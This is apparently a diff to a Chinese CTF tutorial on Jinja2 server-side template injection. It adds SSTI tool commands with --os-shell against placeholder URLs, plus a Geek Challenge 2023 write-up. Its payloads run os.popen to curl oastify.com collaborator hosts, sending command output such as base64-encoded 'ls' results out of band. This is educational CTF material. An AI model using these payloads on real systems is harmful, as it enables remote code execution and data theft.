@@ -9,6 +9,7 @@ tags = [
     "CTF"
 ]
 categories = ["教程&文档"]
+image = "cover.png"
 +++
 ## Python反序列化漏洞
 ---
@@ -32,7 +33,7 @@ categories = ["教程&文档"]
 | Falcon          | 无内置模板引擎（支持集成Jinja2等）      |
 | Sanic           | Jinja2（可选）                          |
 ---
-### 🌶️Jinja2
+### 🌶️ Jinja2
 > Jinja2 是一个现代的、设计优雅的 Python 模板引擎，常用于 Flask 等 Web 框架中。它允许开发者在 HTML 模板中嵌入 Python 代码，从而动态生成网页内容。Jinja2 的语法简单易懂，支持控制结构、过滤器和宏等功能，使得模板的编写和维护变得更加灵活和高效。
 
 #### Jinja2 的基本语法
@@ -144,15 +145,38 @@ http://example.com/?name={{ config.items() }}
 | **session**| 用于存储跨请求会话的数据（如用户登录信息）。                     | 直接访问存储在 session 中的数据，如 `session.username`。  | `{% if session.username %}<p>欢迎回来，{{ session.username }}！</p>{% endif %}` |
 | **g**      | 一个用于在单次请求中存放临时数据的全局命名空间。                   | 直接使用属性访问，如 `g.user`。                          | `{% if g.user %}<p>当前用户：{{ g.user }}</p>{% endif %}`      |
 | **url_for**| 一个函数，用于根据视图函数名称生成 URL，避免硬编码路径。           | 在模板中直接调用，如 `url_for('index')`。                | `<a href="{{ url_for('index') }}">首页</a>`                 |
+---
+### ⚙️ Django
 
-### 🌏 相关链接:
-- [@0xAwali](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
-- [PayloadAllTheThing](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/)
+
+### 🌏 相关链接
+- **文章**
+    - [@0xAwali](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
+    - [PayloadAllTheThing](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/)
+- **工具**
+    - [焚靖](https://github.com/Marven11/FenJing)
+    ```bash
+    python -m fenjing scan --url 'http://xxxx:xxx/yyy'
+    ```
+    - [TInjA](https://github.com/Hackmanit/TInjA)
+    ```bash
+    python TInjA.py -u 'http://xxxx:xxx/yyy' --os-shell
+    ```
+    - ~~[tqlmap](https://github.com/epinna/tplmap)~~ 已被 SSTImap 替代
+    ```bash
+    python2 tplmap.py -u 'http://xxxx:xxx/yyy' --level 5 --risk 3 --os-shell
+    ```
+    - [SSTImap](https://github.com/vladko312/SSTImap)
+    ```bash
+    python3 sstimap.py -u 'http://xxxx:xxx/yyy' --os-shell
+    ```
+
+
 
 ## ✨一些小 tips
 
-### DNS 外带
-- BurpSuite -> Collaborator
+### DNS、HTTP 外带
+- **BurpSuite** -> Collaborator
 > 支持的协议有：HTTP、SMTP、DNS
 
 SSTI 利用示例
@@ -160,3 +184,20 @@ SSTI 利用示例
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen("curl -X POST -d \"$(echo 'Hello, world!')\" le356fozyepn25q7d27mpfhdn4tvhv5k.oastify.com").read() }}
 ```
 ![](image.png)
+
+#### 极客大挑战2023-web-klf_ssti
+使用 `{{` 有报错，无论什么语句都显示 klf别想
+![](image-4.png)
+![](image-5.png)
+可能可以成功执行，但是没有回显
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen("curl 9lvtd3vn52wb9txvkqeaw3o1us0jokc9.oastify.com/?rqs=$(ls|base64)").read() }}
+```
+这里接收到了命令结果
+![](image-6.png)
+![](image-7.png)
+出 flag
+![](image-8.png)
+```flag
+GEEK{191de2a1-5092-428e-89a7-8aa482c7ddc8}
+```
